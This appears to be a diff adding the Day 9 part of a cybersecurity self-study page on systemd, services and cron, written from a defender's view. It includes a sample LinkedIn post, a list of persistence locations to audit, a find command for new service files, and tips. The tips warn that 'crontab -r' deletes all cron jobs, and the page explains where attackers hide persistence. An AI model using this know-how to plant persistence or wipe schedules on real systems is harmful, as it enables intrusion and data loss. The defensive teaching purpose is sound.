+          <div style="font-size:12px;color:var(--color-text-secondary);line-height:1.5">Chapter 6 explains how systemd brings the system up from boot — targets, units, dependencies, and the order of service startup. Ward's explanation of why systemd works the way it does gives you the mental model to understand why attackers place persistence in specific unit file directories, and why the order of things matters when hardening a system. Paired with Chapter 8 from yesterday, this makes the entire lifecycle of a Linux process — from boot to cron to kill — completely clear.</div>
+        </div>
+      </div>
+      <div style="margin-top:.75rem">
+        <span class="tag ta">Chapter 6 tonight</span><span class="tag tb">Builds on Day 8</span><span class="tag tg">Systemd internals</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 9. CONTENT -->
+  <div class="sec">
+    <div class="sh" onclick="tog('content')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-brand-linkedin" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">9. Content Creation Guide</div><div class="ss">What to post · Platform · Hashtags</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-content" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-content">
+      <div class="g2">
+        <div class="mc"><div class="lbl">Best platform</div><div class="val">LinkedIn — the "attacker survived a reboot" persistence story is compelling and widely relatable</div></div>
+        <div class="mc"><div class="lbl">Secondary</div><div class="val">Twitter/X — cron syntax visual cheatsheet as an image works very well here</div></div>
+        <div class="mc"><div class="lbl">Visual idea</div><div class="val">Screenshot of your complete persistence audit output from recon.sh with the new section highlighted</div></div>
+        <div class="mc"><div class="lbl">Strong hook</div><div class="val">"Rebooting a compromised server doesn't remove the attacker if you don't know where to look"</div></div>
+      </div>
+      <h3 style="margin-top:1rem">Sample LinkedIn post</h3>
+      <div class="post-box">Day 9 of my cybersecurity journey — Systemd, Services + Cron
+
+Rebooting a compromised server doesn't necessarily get rid of an attacker.
+
+Here's why: Linux has multiple places where code can be told to run automatically — at boot, on a schedule, or repeatedly in the background. Attackers use all of them.
+
+The 5 persistence locations I learned to audit today:
+
+1. /etc/cron.d/ — system cron jobs (check every file)
+2. crontab -l -u [user] — per-user scheduled tasks
+3. /etc/systemd/system/ — system services that start at boot
+4. ~/.config/systemd/user/ — user-level services (no root needed)
+5. /var/spool/cron/crontabs/ — all users' personal cron jobs
+
+The command that finds recently added backdoor service files:
+find /etc/systemd/system/ -name "*.service" -newer /etc/passwd
+
+If anything shows up there that you didn't put there — that's your investigation starting point.
+
+Added a full persistence audit section to my recon.sh script today. Growing it every day.
+
+Day 9 of 90. 🛡️
+
+#Cybersecurity #Linux #BlueTeam #IncidentResponse #Persistence #Systemd #Cron #LearnInPublic #100DaysOfCyber</div>
+    </div>
+  </div>
+
+  <!-- 10. TIPS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('tips')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-bulb" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">10. Pro Tips & Mindset</div><div class="ss">What professionals know about services and persistence</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-tips" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-tips">
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p>Bookmark <code>crontab.guru</code> and use it every single time you encounter a cron expression. Do not try to decode <code>*/15 2-6 * * 1-5</code> in your head. Even experienced sysadmins use crontab.guru. Speed and accuracy matter more than mental arithmetic.</p></div>
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p><code>journalctl -u servicename -f</code> is your best friend when debugging a new service. The <code>-f</code> flag follows in real time — you see log output the moment it's written. Combined with <code>systemctl status</code> in another terminal, you can diagnose most service issues in under a minute.</p></div>
+      <div class="tip-item"><i class="ti ti-star" style="color:var(--color-text-warning)" aria-hidden="true"></i><p>Always run <code>systemctl daemon-reload</code> after creating or editing a unit file. Without it, systemd uses its in-memory cache and ignores your changes entirely. This trips up beginners and experienced sysadmins alike — it is a mandatory step, not optional.</p></div>
+      <div class="tip-item"><i class="ti ti-alert-triangle" style="color:var(--color-text-danger)" aria-hidden="true"></i><p>Common mistake: editing a unit file directly in <code>/lib/systemd/system/</code>. These files are owned by packages and will be overwritten on updates. Always copy to <code>/etc/systemd/system/</code> first (or use <code>systemctl edit servicename</code> which handles this for you) before making changes.</p></div>
+      <div class="tip-item"><i class="ti ti-alert-triangle" style="color:var(--color-text-danger)" aria-hidden="true"></i><p>Common mistake: thinking <code>crontab -r</code> is <code>crontab -e</code>. The <code>-r</code> flag removes the entire crontab without confirmation. One mistyped character and all cron jobs are gone. Always double-check before running any <code>crontab</code> command with a destructive flag.</p></div>
+      <div class="tip-item"><i class="ti ti-shield" style="color:var(--color-text-success)" aria-hidden="true"></i><p>Pro mindset: when investigating a persistence mechanism, always ask "what maintains this?" before removing it. A cron job that downloads a payload needs its outbound connection blocked at the firewall — not just the cron entry removed. A service that re-installs itself from a dropper script needs the dropper found and removed first. Remove the maintenance mechanism before the visible artefact, or the attacker will re-establish within minutes.</p></div>
+    </div>
+  </div>
+
+  <!-- 11. RECAP -->
+  <div class="sec">
+    <div class="sh" onclick="tog('recap')">
+      <div class="sl"><div class="si" style="background:var(--color-background-secondary)"><i class="ti ti-moon" style="color:var(--color-text-secondary)" aria-hidden="true"></i></div><div><div class="st">11. Quick Recap</div><div class="ss">5 questions before you sleep</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-recap" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-recap">
+      <p>Answer all 5 from memory. These appear in blue team interviews, CTF challenges, and real incident response.</p>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What do the 5 fields of a cron expression represent? What does <code>*/5 * * * *</code> mean? What does <code>@reboot</code> do?</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">Name all 5 cron-related file locations on a Linux system that must be checked during a persistence audit.</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What is the difference between <code>/lib/systemd/system/</code> and <code>/etc/systemd/system/</code>? Which one do attackers target and why?</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What command must be run after creating or modifying a unit file before systemd will recognise the change?</div></div>
+      <div class="task-item"><div class="tnum">✓</div><div class="ttxt">What single <code>find</code> command would detect recently created backdoor service files in the systemd system directory?</div></div>
+      <div class="div"></div>
+      <p>5/5 and Day 9 is complete. Tomorrow is <strong>Day 10: Networking Commands</strong> — <code>ip</code>, <code>ss</code>, <code>netstat</code>, <code>dig</code>, and understanding the network layer that connects all the systems you have been hardening.</p>
+      <div style="margin-top:.75rem"><span class="tag tb">Day 10 →</span><span class="tag tg">Networking Commands · ip · ss · netstat · dig</span></div>
+    </div>
+  </div>
+</div>
+
+<script>
+function tog(id){
+  const b=document.getElementById('body-'+id);
+  const c=document.getElementById('chev-'+id);
+  if(!b)return;
+  const o=b.classList.contains('open');
+  b.classList.contains('open')?b.classList.remove('open'):b.classList.add('open');
+  if(c)c.classList.contains('open')?c.classList.remove('open'):c.classList.add('open');
+}
+tog('theory');
+</script>
